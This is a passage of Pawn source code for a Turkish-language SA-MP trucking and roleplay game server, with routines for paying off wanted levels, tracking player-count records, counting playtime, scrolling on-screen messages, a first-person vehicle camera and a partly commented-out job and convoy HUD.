            	DestroyObject(AVehicleData[vehicleid][NeonLeft]);
            	DestroyObject(AVehicleData[vehicleid][NeonRight]);
            	AVehicleData[vehicleid][NeonLeft] = 0;
            	AVehicleData[vehicleid][NeonRight] = 0;
            	AVehicleData[vehicleid][NeonObjectModel] = 0;
	        }
		}
	}
}
/*
CMD:oldspeedo(playerid, params[])
{
	if(MagaraAdami[playerid] == 0)
	{
	    MagaraAdami[playerid] = 1;
	    SendClientMessage(playerid, -1, "{F8F8FF}Eski SpeedoMeter'i kullanmaya baþladýnýz.");
	}else{
	    MagaraAdami[playerid] = 0;
	    SendClientMessage(playerid, -1, "{F8F8FF}Yeni SpeedoMeter'i kullanmaya baþladýnýz.");
	}
	return 1;
}
*/
LoadCezaOdemeYerleri()
{
	for(new i; i < sizeof(CezaOdemeYerleri); i++)
	{
	    CreatePickup(1247, 1, CezaOdemeYerleri[i][0], CezaOdemeYerleri[i][1], CezaOdemeYerleri[i][2]);
	    Create3DTextLabel("{F8F8FF}Aranma yýldýzlarýnýzdan kurtulmak için {ADFF2F}/cezaode", 0xFFFFFF, CezaOdemeYerleri[i][0], CezaOdemeYerleri[i][1], CezaOdemeYerleri[i][2], 20.0, 0);
	}
}

IsInCezaOdemeYeri(playerid) // güzel ama ingiliççe by evo
{
	new Sonuc;
	for(new i; i < sizeof(CezaOdemeYerleri); i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 5.0, CezaOdemeYerleri[i][0], CezaOdemeYerleri[i][1], CezaOdemeYerleri[i][2]))
		{
		    Sonuc = 1;
		    break;
		}
	}
	return Sonuc;
}

IsAnybodyPolice()
{
	new Sonuc;
	foreach(new i:Player)
	{
	    if(APlayerData[i][PlayerClass] == ClassPolice || APlayerData[i][PlayerClass] == ClassFBY)
	    {
	        Sonuc = 1;
	        break;
	    }
	}
	return Sonuc;
}

CMD:cezaode(playerid, params[])
{
	if(APlayerData[playerid][PlayerWanted] == 0) return SendClientMessage(playerid, -1, "{FF0000}Zaten aranmýyorsunuz!");
	if(IsAnybodyPolice()) return SendClientMessage(playerid, -1, "{FF0000}Oyunda polis varken bu komutu kullanamazsýnýz!");
	if(!IsInCezaOdemeYeri(playerid)) return SendClientMessage(playerid, -1, "{FF0000}Ceza ödemek için karakol önünde olmalýsýnýz!");
	if(GetPlayerMoney(playerid) < APlayerData[playerid][PlayerWanted] * 1000) return SendClientMessage(playerid, -1, "{FF0000}Ceza ödemek için yeterli paranýz yok! ( Aranma Seviyesi x 1.000$ )");
	RewardPlayer(playerid, -APlayerData[playerid][PlayerWanted]*1000, 0);

	new Yazi[128];
	format(Yazi, 128, "{FF0000}%d$ {F8F8FF}ödeyerek aranma yýldýzlarýnýzdan kurtuldunuz.", APlayerData[playerid][PlayerWanted]*1000);
	SendClientMessage(playerid, -1, Yazi);

	APlayerData[playerid][PlayerWanted] = 0;
	SilahUyari[playerid] = 0;
	SilahUyariM[playerid] = 0;
	return 1;
}

// ************************************************************************************************************************************************************
// Rekor Ölçüm Sistemi
// ************************************************************************************************************************************************************
forward LoadRekor(name[], value[]);
public LoadRekor(name[], value[])
{
	INI_Int("REKOR", Rekor);
	INI_String("TARIH", RekorTarih, 20);
	return 1;
}

forward SaveRekor();
public SaveRekor()
{
	new RekorFileName[50];
	format(RekorFileName, 50, "ServerData/Rekor.ini");

	new INI:File = INI_Open(RekorFileName);

	INI_WriteInt(File, "REKOR", Rekor);
	INI_WriteString(File, "TARIH", RekorTarih);

	INI_Close(File);
}

RekorOlc()
{
	new OyuncuSayisi = Iter_Count(Player);
	if(OyuncuSayisi < 15) return 1;
	if(OyuncuSayisi > Rekor)
	{
		new gun, ay, yil;
		getdate(yil, ay, gun);

	    Rekor = OyuncuSayisi;
		format(RekorTarih, 20, "%d.%d.%d", gun, ay, yil);
		SaveRekor();

	    new Yazi[128];
	    format(Yazi, 128, "{F8F8FF}Sunucumuz {ADFF2F}%d kiþi {F8F8FF}rekoruna ulaþtý.", Rekor);
	    SendClientMessageToAll(-1, Yazi);
	    SendClientMessageToAll(-1, "{F8F8FF}Oyuncularýmýza teþekkür ederiz. Herkese 15.000$ ve 3 skor daðýtýlacak");

	    format(Yazi, 128, "Sunucu %d kiþi rekorunu kýrdý.", Rekor);
	    LOG(Yazi);

	    foreach(new i:Player)
	    {
			RewardPlayer(i, 15000, 3);
	    }
	}

	return 1;
}

OyunSuresiVer(playerid)
{
	pInfo[playerid][pOSaniye]++;

	if(pInfo[playerid][pOSaniye] == 60)
	{
	    pInfo[playerid][pOSaniye]-=60;
	    pInfo[playerid][pODakika]++;

		if(pInfo[playerid][pODakika] == 60)
		{
		    pInfo[playerid][pODakika]-=60;
		    pInfo[playerid][pOSaat]++;
		    GivePlayerAchievement(playerid, HirsliOyuncuAch, 1); // Baþarým Sistemi
		    GivePlayerAchievement(playerid, DaimiOyuncuAch, 1); // Baþarým Sistemi
		    GivePlayerAchievement(playerid, ServerEmektariAch, 1); // Baþarým Sistemi
			GivePlayerAchievement(playerid, MerakliOyuncuAch, 1); // Baþarým Sistemi

		    if(pInfo[playerid][pOSaat] == 24)
		    {
		        pInfo[playerid][pOSaat]-=24;
		        pInfo[playerid][pOGun]++;
		    }
		}
	}
}
// ************************************************************************************************************************************************************
// Yeni SendAdminText [ EvoturK ]
// ************************************************************************************************************************************************************
/*
new PlayerText:UI_AdminText[MAX_PLAYERS][7];
new AdminTextYazi[MAX_PLAYERS][7][256];
*/
LoadSendAdminText(playerid)
{
	for(new i; i < 7; i++)
	{
		UI_AdminText[playerid][i] = CreatePlayerTextDraw(playerid, 10.000000, 170.0 + (i * 10.0), " ");
		PlayerTextDrawBackgroundColor(playerid, UI_AdminText[playerid][i], 255);
		PlayerTextDrawFont(playerid, UI_AdminText[playerid][i], 2);
		PlayerTextDrawLetterSize(playerid, UI_AdminText[playerid][i], 0.190000, 1.100000);
		PlayerTextDrawColor(playerid, UI_AdminText[playerid][i], -1431655681);
		PlayerTextDrawSetOutline(playerid, UI_AdminText[playerid][i], 1);
		PlayerTextDrawSetProportional(playerid, UI_AdminText[playerid][i], 1);
		PlayerTextDrawShow(playerid, UI_AdminText[playerid][i]);
	}
}

ScrollSendAdminText(playerid, msg[])
{
	for(new i; i < 7; i++)
	{
		if(i == 0) continue;
		format(AdminTextYazi[playerid][i-1], 256, AdminTextYazi[playerid][i]);
		PlayerTextDrawSetString(playerid, UI_AdminText[playerid][i-1], AdminTextYazi[playerid][i-1]);
	}

	format(AdminTextYazi[playerid][6], 256, msg);
	PlayerTextDrawSetString(playerid, UI_AdminText[playerid][6], AdminTextYazi[playerid][6]);
}

// ************************************************************************************************************************************************************
// Yeni SendDuyuruText [ Reiss_Umut ]
// ************************************************************************************************************************************************************

LoadSendDuyuruText(playerid)
{
	for(new i; i < 7; i++ && TextKapat[playerid] == 0)
	{
		UI_DuyuruText[playerid][i] = CreatePlayerTextDraw(playerid, 8.000000, 259.0 + (i * 10.0), " ");
		PlayerTextDrawBackgroundColor(playerid, UI_DuyuruText[playerid][i], 255);
		PlayerTextDrawFont(playerid, UI_DuyuruText[playerid][i], 2);
		PlayerTextDrawLetterSize(playerid, UI_DuyuruText[playerid][i], 0.160000, 1.000000);
		PlayerTextDrawColor(playerid, UI_DuyuruText[playerid][i], -1);
		PlayerTextDrawSetOutline(playerid, UI_DuyuruText[playerid][i], 1);
		PlayerTextDrawSetProportional(playerid, UI_DuyuruText[playerid][i], 1);
		PlayerTextDrawShow(playerid, UI_DuyuruText[playerid][i]);
	}
}

ScrollSendDuyuruText(playerid, msg[])
{
	for(new i; i < 7; i++)
	{
		if(i == 0) continue;
		format(DuyuruTextYazi[playerid][i-1], 256, DuyuruTextYazi[playerid][i]);
		PlayerTextDrawSetString(playerid, UI_DuyuruText[playerid][i-1], DuyuruTextYazi[playerid][i-1]);
	}

	format(DuyuruTextYazi[playerid][6], 256, msg);
	PlayerTextDrawSetString(playerid, UI_DuyuruText[playerid][6], DuyuruTextYazi[playerid][6]);
}

// ************************************************************************************************************************************************************
// FPS Kamerasý [ EvoturK ]
// ************************************************************************************************************************************************************
CMD:fps(playerid, params[])
{
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, -1, "{FF0000}Bu komutu yazabilmek için arabada olmalýsýnýz");
	if(OyuncuAFPS[playerid] == 0)
	{
 		new	oAraba = GetPlayerVehicleID(playerid);

		OyuncuAFPS_Obje[playerid] = CreateObject(19300, 0.0000, -1282.9984, 10.1493, 0.0000, -1, -1, 100.0);
		switch(GetVehicleModel(oAraba))
		{
		    case VehicleRoadTrain, VehicleLineRunner, VehicleTanker:
		    {
		        AttachObjectToVehicle(OyuncuAFPS_Obje[playerid], oAraba, -0.314999, 0.895000, 0.910000, 0.000000, 0.000000, 0.000000);
		    }

		    case VehicleDFT30:
		    {
		        AttachObjectToVehicle(OyuncuAFPS_Obje[playerid], oAraba, -0.314999, 1.395000, 0.910000, 0.000000, 0.000000, 0.000000);
		    }

		    case VehicleCementTruck:
		    {
		        AttachObjectToVehicle(OyuncuAFPS_Obje[playerid], oAraba, -0.314999, 1.395000, 0.510000, 0.000000, 0.000000, 0.000000);
		    }

		    case VehicleFlatbed:
		    {
		        AttachObjectToVehicle(OyuncuAFPS_Obje[playerid], oAraba, -0.314999, 0.895000, 1.210000, 0.000000, 0.000000, 0.000000);
		    }

			default:
			{
			    AttachObjectToVehicle(OyuncuAFPS_Obje[playerid], oAraba, -0.314999, -0.195000, 0.510000, 0.000000, 0.000000, 0.000000);
			}
		}
		AttachCameraToObject(playerid, OyuncuAFPS_Obje[playerid]);
		OyuncuAFPS[playerid] = 1;
	}else if(OyuncuAFPS[playerid] == 1)
	{
		SetCameraBehindPlayer(playerid);
		DestroyObject(OyuncuAFPS_Obje[playerid]);
		OyuncuAFPS[playerid] = 0;
	}
 	return 1;
}

// ************************************************************************************************************************************************************
// V4 Oyuncu Arayüzü [ EvoturK ]
// ************************************************************************************************************************************************************
/*LoadPlayerUI(playerid)
{
	UI_ONick[playerid] = CreatePlayerTextDraw(playerid,515.000000, 116.000000, " ");
	PlayerTextDrawBackgroundColor(playerid,UI_ONick[playerid], 255);
	PlayerTextDrawFont(playerid,UI_ONick[playerid], 1);
	PlayerTextDrawLetterSize(playerid,UI_ONick[playerid], 0.310000, 1.200000);
	PlayerTextDrawColor(playerid,UI_ONick[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_ONick[playerid], 1);
	PlayerTextDrawSetProportional(playerid,UI_ONick[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,UI_ONick[playerid], 0);

	UI_OBilgi[playerid] = CreatePlayerTextDraw(playerid,515.000000, 127.000000,  " ");
	PlayerTextDrawBackgroundColor(playerid,UI_OBilgi[playerid], 255);
	PlayerTextDrawFont(playerid,UI_OBilgi[playerid], 1);
	PlayerTextDrawLetterSize(playerid,UI_OBilgi[playerid], 0.210000, 0.899999);
	PlayerTextDrawColor(playerid,UI_OBilgi[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_OBilgi[playerid], 1);
	PlayerTextDrawSetProportional(playerid,UI_OBilgi[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,UI_OBilgi[playerid], 0);


	UI_GYuk[playerid] = CreatePlayerTextDraw(playerid,515.000000, 195.000000, " ");
	PlayerTextDrawBackgroundColor(playerid,UI_GYuk[playerid], 255);
	PlayerTextDrawFont(playerid,UI_GYuk[playerid], 1);
	PlayerTextDrawLetterSize(playerid,UI_GYuk[playerid], 0.310000, 1.200000);
	PlayerTextDrawColor(playerid,UI_GYuk[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_GYuk[playerid], 1);
	PlayerTextDrawSetProportional(playerid,UI_GYuk[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,UI_GYuk[playerid], 0);

	UI_GYer[playerid] = CreatePlayerTextDraw(playerid,515.000000, 206.000000, " ");
	PlayerTextDrawBackgroundColor(playerid,UI_GYer[playerid], 255);
	PlayerTextDrawFont(playerid,UI_GYer[playerid], 1);
	PlayerTextDrawLetterSize(playerid,UI_GYer[playerid], 0.210000, 0.899999);
	PlayerTextDrawColor(playerid,UI_GYer[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_GYer[playerid], 1);
	PlayerTextDrawSetProportional(playerid,UI_GYer[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,UI_GYer[playerid], 0);


	UI_Konvoy[playerid] = CreatePlayerTextDraw(playerid, 321.000000, 1.000000, " ");
	PlayerTextDrawAlignment(playerid,UI_Konvoy[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,UI_Konvoy[playerid], 255);
	PlayerTextDrawFont(playerid,UI_Konvoy[playerid], 1);
	PlayerTextDrawLetterSize(playerid,UI_Konvoy[playerid], 0.200000, 0.799999);
	PlayerTextDrawColor(playerid,UI_Konvoy[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_Konvoy[playerid], 1);
	PlayerTextDrawSetProportional(playerid,UI_Konvoy[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,UI_Konvoy[playerid], 0);




}

UpdatePlayerUI(playerid)
{
	if(APlayerSpawnData[playerid] == false)
	{
		TextDrawHideForPlayer(playerid, UI_AltBox);
		TextDrawHideForPlayer(playerid, UI_AltInfo);
		TextDrawHideForPlayer(playerid, UI_AltLogo[0]);
 		TextDrawHideForPlayer(playerid, UI_AltLogo[1]);
		TextDrawHideForPlayer(playerid, UI_UstBox);
		TextDrawHideForPlayer(playerid, UI_SaatTarih);

		TextDrawHideForPlayer(playerid, UI_OLogo);
		PlayerTextDrawHide(playerid, UI_ONick[playerid]);
		PlayerTextDrawHide(playerid, UI_OBilgi[playerid]);

		TextDrawHideForPlayer(playerid, UI_GLogo);
		PlayerTextDrawHide(playerid, UI_GYuk[playerid]);
		PlayerTextDrawHide(playerid, UI_GYer[playerid]);

		PlayerTextDrawHide(playerid, UI_Konvoy[playerid]);
		TextDrawHideForPlayer(playerid, UI_MLogo);

		PlayerTextDrawHide(playerid, UI_WantedL[playerid]);
		PlayerTextDrawHide(playerid, UI_Wanted[playerid]);

		TextDrawHideForPlayer(playerid, UI_FLogo[0]);
 		TextDrawHideForPlayer(playerid, UI_FLogo[1]);
 		TextDrawHideForPlayer(playerid, UI_FLogo[2]);

 		// Yýlbaþý TextDrawlarý
TextDrawHideForPlayer(playerid, Textdraw17);
TextDrawHideForPlayer(playerid, Textdraw18);
TextDrawHideForPlayer(playerid, Textdraw19);
TextDrawHideForPlayer(playerid, Textdraw20);
TextDrawHideForPlayer(playerid, Textdraw21);
TextDrawHideForPlayer(playerid, Textdraw22);
TextDrawHideForPlayer(playerid, Textdraw23);
TextDrawHideForPlayer(playerid, Textdraw24);
TextDrawHideForPlayer(playerid, Textdraw25);
TextDrawHideForPlayer(playerid, Textdraw26);
TextDrawHideForPlayer(playerid, Textdraw27);
TextDrawHideForPlayer(playerid, Textdraw28);
TextDrawHideForPlayer(playerid, Textdraw29);
TextDrawHideForPlayer(playerid, Textdraw30);
TextDrawHideForPlayer(playerid, Textdraw31);
TextDrawHideForPlayer(playerid, Textdraw32);
TextDrawHideForPlayer(playerid, Textdraw33);
TextDrawHideForPlayer(playerid, Textdraw34);
TextDrawHideForPlayer(playerid, Textdraw35);
TextDrawHideForPlayer(playerid, Textdraw36);
TextDrawHideForPlayer(playerid, Textdraw37);
TextDrawHideForPlayer(playerid, Textdraw38);
TextDrawHideForPlayer(playerid, Textdraw39);
TextDrawHideForPlayer(playerid, Textdraw40);
TextDrawHideForPlayer(playerid, Textdraw41);
TextDrawHideForPlayer(playerid, Textdraw42);
TextDrawHideForPlayer(playerid, Textdraw43);
TextDrawHideForPlayer(playerid, Textdraw44);

		// 23 Nisan TextDrawlarý
TextDrawHideForPlayer(playerid, Textdraw45);
TextDrawHideForPlayer(playerid, Textdraw46);
TextDrawHideForPlayer(playerid, Textdraw47);

		Skawmed[playerid] = 0;
		return 1;
	}

	if(TextKapat[playerid] == 1)
	{
		TextDrawHideForPlayer(playerid, UI_AltBox);
		TextDrawHideForPlayer(playerid, UI_AltInfo);
		TextDrawHideForPlayer(playerid, UI_AltLogo[0]);
 		TextDrawHideForPlayer(playerid, UI_AltLogo[1]);
		TextDrawHideForPlayer(playerid, UI_UstBox);
		TextDrawHideForPlayer(playerid, UI_SaatTarih);

		TextDrawHideForPlayer(playerid, UI_OLogo);
		PlayerTextDrawHide(playerid, UI_ONick[playerid]);
		PlayerTextDrawHide(playerid, UI_OBilgi[playerid]);

		TextDrawHideForPlayer(playerid, UI_GLogo);
		PlayerTextDrawHide(playerid, UI_GYuk[playerid]);
		PlayerTextDrawHide(playerid, UI_GYer[playerid]);

		PlayerTextDrawHide(playerid, UI_Konvoy[playerid]);
		TextDrawHideForPlayer(playerid, UI_MLogo);

		PlayerTextDrawHide(playerid, UI_WantedL[playerid]);
		PlayerTextDrawHide(playerid, UI_Wanted[playerid]);

		TextDrawHideForPlayer(playerid, UI_FLogo[0]);
 		TextDrawHideForPlayer(playerid, UI_FLogo[1]);
 		TextDrawHideForPlayer(playerid, UI_FLogo[2]);

		// Yýlbaþý TextDrawlarý
		TextDrawHideForPlayer(playerid, Textdraw17);
		TextDrawHideForPlayer(playerid, Textdraw18);
		TextDrawHideForPlayer(playerid, Textdraw19);
		TextDrawHideForPlayer(playerid, Textdraw20);
		TextDrawHideForPlayer(playerid, Textdraw21);
		TextDrawHideForPlayer(playerid, Textdraw22);
		TextDrawHideForPlayer(playerid, Textdraw23);
		TextDrawHideForPlayer(playerid, Textdraw24);
		TextDrawHideForPlayer(playerid, Textdraw25);
		TextDrawHideForPlayer(playerid, Textdraw26);
		TextDrawHideForPlayer(playerid, Textdraw27);
		TextDrawHideForPlayer(playerid, Textdraw28);
		TextDrawHideForPlayer(playerid, Textdraw29);
		TextDrawHideForPlayer(playerid, Textdraw30);
		TextDrawHideForPlayer(playerid, Textdraw31);
		TextDrawHideForPlayer(playerid, Textdraw32);
		TextDrawHideForPlayer(playerid, Textdraw33);
		TextDrawHideForPlayer(playerid, Textdraw34);
		TextDrawHideForPlayer(playerid, Textdraw35);
		TextDrawHideForPlayer(playerid, Textdraw36);
		TextDrawHideForPlayer(playerid, Textdraw37);
		TextDrawHideForPlayer(playerid, Textdraw38);
		TextDrawHideForPlayer(playerid, Textdraw39);
		TextDrawHideForPlayer(playerid, Textdraw40);
		TextDrawHideForPlayer(playerid, Textdraw41);
		TextDrawHideForPlayer(playerid, Textdraw42);
		TextDrawHideForPlayer(playerid, Textdraw43);
		TextDrawHideForPlayer(playerid, Textdraw44);

		// 23 Nisan TextDrawlarý
		TextDrawHideForPlayer(playerid, Textdraw45);
		TextDrawHideForPlayer(playerid, Textdraw46);
		TextDrawHideForPlayer(playerid, Textdraw47);

		Skawmed[playerid] = 0;
		return 1;
	}

	// TextDraw Yazý
	new Yazi[300];

	// Oyuncu Adý TextDraw
	PlayerTextDrawSetString(playerid, UI_ONick[playerid], GetName(playerid));

	// Oyuncu Rank TextDraw
	switch(APlayerData[playerid][PlayerClass])
	{
		case ClassTruckDriver: format(Yazi, 300, "~r~Kamyoncu - %s~n~~w~Oyuncu Istatistikleri: ~g~~h~~h~/stats", TruckerRanks[ Rank[playerid] ][RankName]);
		case ClassBusDriver: format(Yazi, 300, "~b~~h~~h~~h~Otobuscu - %s~n~~w~Oyuncu Istatistikleri: ~g~~h~~h~/stats", BusDriverRanks[ Rank[playerid] ][RankName]);
 		case ClassPilot: format(Yazi, 300, "~g~~h~~h~Pilot - %s~n~~w~Oyuncu Istatistikleri: ~g~~h~~h~/stats", PilotRanks[ Rank[playerid] ][RankName]);
  		case ClassPolice: format(Yazi, 300, "~b~~h~Polis - %s~n~~w~Oyuncu Istatistikleri: ~g~~h~~h~/stats", PoliceRanks[ Rank[playerid] ][RankName]);
   		case ClassMafia: format(Yazi, 300, "~p~Mafya - %s~n~~w~Oyuncu Istatistikleri: ~g~~h~~h~/stats", MafiaRanks[ Rank[playerid] ][RankName]);
    	case ClassRoadWorker: format(Yazi, 300, "~y~Yol Iscisi - %s~n~~w~Oyuncu Istatistikleri: ~g~~h~~h~/stats", RoadWorkerRanks[ Rank[playerid] ][RankName]);
    	case ClassGemici: format(Yazi, 300, "~b~~h~~h~~h~Gemici - %s~n~~w~Oyuncu Istatistikleri: ~g~~h~~h~/stats", GemiciRanks[ Rank[playerid] ][RankName]);
    	case ClassOduncu: format(Yazi, 300, "~g~Oduncu - %s~n~~w~Oyuncu Istatistikleri: ~g~~h~~h~/stats", OduncuRanks[ Rank[playerid] ][RankName]);
    	case ClassBalikci: format(Yazi, 300, "~b~~h~~h~~h~Balikci - %s~n~~w~Oyuncu Istatistikleri: ~g~~h~~h~/stats", BalikciRanks[ Rank[playerid] ][RankName]);
    	case ClassCopcu: format(Yazi, 300, "~b~~h~~h~~h~Copcu - %s~n~~w~Oyuncu Istatistikleri: ~g~~h~~h~/stats", CopcuRanks[ Rank[playerid] ][RankName]);
    	case ClassBanka: format(Yazi, 300, "~b~~h~~h~~h~Bankaci - %s~n~~w~Oyuncu Istatistikleri: ~g~~h~~h~/stats", BankaRanks[ Rank[playerid] ][RankName]);
    	case ClassFire: format(Yazi, 300, "~b~~h~~h~~h~Itfaiyeci - %s~n~~w~Oyuncu Istatistikleri: ~g~~h~~h~/stats", FireRanks[ Rank[playerid] ][RankName]);
        case ClassFBY: format(Yazi, 300, "~b~~h~~h~~h~Cevik Kuvvet - %s~n~~w~Oyuncu Istatistikleri: ~g~~h~~h~/stats", FBYRanks[ Rank[playerid] ][RankName]);
        case ClassPboy: format(Yazi, 300, "~b~~h~~h~~h~Pizzaci - %s~n~~y~/stats", PboyRanks[ Rank[playerid] ][RankName]);
	}

	PlayerTextDrawSetString(playerid, UI_OBilgi[playerid], Yazi);

	// Aranma TextDraw
	if(APlayerData[playerid][PlayerWanted] > 8)
	{
		PlayerTextDrawSetString(playerid, UI_WantedL[playerid], "]");
		format(Yazi, 300, "%d", APlayerData[playerid][PlayerWanted]);
		PlayerTextDrawSetString(playerid, UI_Wanted[playerid], Yazi);
	}else{
	    if(APlayerData[playerid][PlayerWanted] > 0)
	    {
	    	format(Yazi, 300, "");
	    	for(new i=0; i < APlayerData[playerid][PlayerWanted]; i++)
	    	{
				format(Yazi, 300, "%s]", Yazi);
	    	}
		}

		PlayerTextDrawSetString(playerid, UI_WantedL[playerid], Yazi);
	}

	// Konvoy TextDraw
	if(APlayerData[playerid][InConvoy] == true)
	{
	    new Convoy = APlayerData[playerid][ConvoyID];
	    new LeaderID = AConvoys[Convoy][Members][0];

		if(playerid == LeaderID)
		{
			if(Convoy_CountMembers(Convoy) > 1)
			{
				format(Yazi, 300, "~w~Konvoy > ~w~Uye ~r~%d Kisi ~w~En Uzak ~r~%s ~w~Mesafe ~r~%dm", Convoy_CountMembers(Convoy), GetName( Convoy_GetFurthestMember(Convoy) ), PlayerToPlayer(playerid, Convoy_GetFurthestMember(Convoy)));
			}else{
				format(Yazi, 300, "~w~Konvoy > ~w~Uye ~r~%d Kisi ~w~En Uzak ~r~- ~w~Mesafe ~r~-", Convoy_CountMembers(Convoy));
			}
			PlayerTextDrawSetString(playerid, UI_Konvoy[playerid], Yazi);
		}else{
			format(Yazi, 300, "~w~Konvoy > ~w~Lider ~r~%s ~w~Uye ~r~%d Kisi ~w~Mesafe ~r~%dfm", GetName(LeaderID), Convoy_CountMembers(Convoy), PlayerToPlayer(playerid, LeaderID));
            PlayerTextDrawSetString(playerid, UI_Konvoy[playerid], Yazi);
		}
	}else{
		PlayerTextDrawSetString(playerid, UI_Konvoy[playerid], " ");
	}

	new Mesafe, Float:oX, Float:oY, Float:oZ, Float:XF, Float:YF, Float:ZF;
	GetPlayerPos(playerid, oX, oY, oZ);

	// Oyuncu Meslek Görev TextDraw
	switch(APlayerData[playerid][PlayerClass])
	{
		case ClassTruckDriver:
		{
		    if(APlayerData[playerid][InConvoy] == true)
		    {
		        if(APlayerData[playerid][JobStarted] == true)
		        {
  					format(Yazi, 300, ALoads[APlayerData[playerid][LoadID]][LoadName]);
					PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

		            if(APlayerData[playerid][JobStep] == 1)
		            {
						XF = ALocations[APlayerData[playerid][JobLoc1]][LocX] - oX;
						YF = ALocations[APlayerData[playerid][JobLoc1]][LocY] - oY;
						ZF = ALocations[APlayerData[playerid][JobLoc1]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

						format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~w~Mesafe ~y~%dm", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
		            }

		            if(APlayerData[playerid][JobStep] == 2)
		            {
						format(Yazi, 300, "~w~Diger konvoy uyelerinin~n~yuk almasini bekleyin.");
						PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
		            }

		            if(APlayerData[playerid][JobStep] == 3)
		            {
						XF = ALocations[APlayerData[playerid][JobLoc2]][LocX] - oX;
						YF = ALocations[APlayerData[playerid][JobLoc2]][LocY] - oY;
						ZF = ALocations[APlayerData[playerid][JobLoc2]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

						format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~w~Mesafe ~y~%dm", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
		            }

		            if(APlayerData[playerid][JobStep] == 4)
		            {
						format(Yazi, 300, "~w~Diger konvoy uyelerinin~n~yuk bosaltmasini bekleyin.");
						PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
		            }
		        }else{
					format(Yazi, 300, "Gorev Yok");
					PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

					format(Yazi, 300, "~w~Konvoy liderinizin gorev~n~baslatmasini bekleyin.");
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
		        }
		    }else{
		        if(APlayerData[playerid][JobStarted] == true)
		        {
  					format(Yazi, 300, ALoads[APlayerData[playerid][LoadID]][LoadName]);
					PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

		            if(APlayerData[playerid][JobStep] == 1)
		            {
						XF = ALocations[APlayerData[playerid][JobLoc1]][LocX] - oX;
						YF = ALocations[APlayerData[playerid][JobLoc1]][LocY] - oY;
						ZF = ALocations[APlayerData[playerid][JobLoc1]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

						format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
		            }

		            if(APlayerData[playerid][JobStep] == 2)
		            {
						XF = ALocations[APlayerData[playerid][JobLoc2]][LocX] - oX;
						YF = ALocations[APlayerData[playerid][JobLoc2]][LocY] - oY;
						ZF = ALocations[APlayerData[playerid][JobLoc2]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

						format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
		            }
		        }else{
					format(Yazi, 300, "Gorev Yok");
					PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

					format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
		        }
		    }
		}
		case ClassBusDriver:
		{
		    if(APlayerData[playerid][InConvoy] == true)
		    {
		        if(APlayerData[playerid][JobStarted] == true)
		        {
  					format(Yazi, 300, "Yolcu");
					PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

		            if(APlayerData[playerid][JobStep] == 1)
		            {
						XF = BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocX] - oX;
						YF = BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocY] - oY;
						ZF = BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

						format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocationName], BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
		            }

		            if(APlayerData[playerid][JobStep] == 2)
		            {
						format(Yazi, 300, "~w~Diger konvoy uyelerinin~n~yolcu almasini bekleyin.");
						PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
		            }

		            if(APlayerData[playerid][JobStep] == 3)
		            {
						XF = BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocX] - oX;
						YF = BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocY] - oY;
						ZF = BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

